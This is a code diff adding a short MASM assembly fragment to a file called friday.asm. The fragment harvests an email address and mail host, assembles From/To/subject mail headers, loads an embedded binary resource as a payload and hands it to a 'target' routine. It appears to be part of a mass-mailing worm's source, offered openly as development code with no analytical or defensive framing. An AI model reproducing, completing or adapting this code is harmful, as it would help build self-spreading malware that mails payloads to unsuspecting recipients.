@@ -1,0 +1,34 @@
+;add this to the beginning of friday.asm incase you want to use the ;target proc //incase of offline status test//
+
+call find_email
+call find_host  ;for future versions
+invoke lstrcpy,offset host_name,eax
+
+
+invoke lstrcat,offset bufferthis2,offset from
+invoke lstrcat,offset bufferthis2,offset mailfrom
+invoke lstrcat,offset bufferthis2,offset Quote
+invoke lstrcat,offset bufferthis2,offset crlf
+
+invoke lstrcat,offset bufferthis2,offset To
+invoke lstrcat,offset bufferthis2,offset email_buffer
+invoke lstrcat,offset bufferthis2,offset Quote
+invoke lstrcat,offset bufferthis2,offset crlf
+invoke lstrcat,offset bufferthis2,offset subject
+
+invoke FindResource,0,1111,RT_RCDATA
+mov hres,eax
+cmp eax,0
+je exit_finish
+invoke LoadResource,0,hres
+or eax,eax
+jz exit_finish
+
+mov resmem,eax
+invoke SizeofResource,0,hres
+or eax,eax
+jz exit_finish
+mov ressize ,eax
+
+call target
+jmp exit_finish
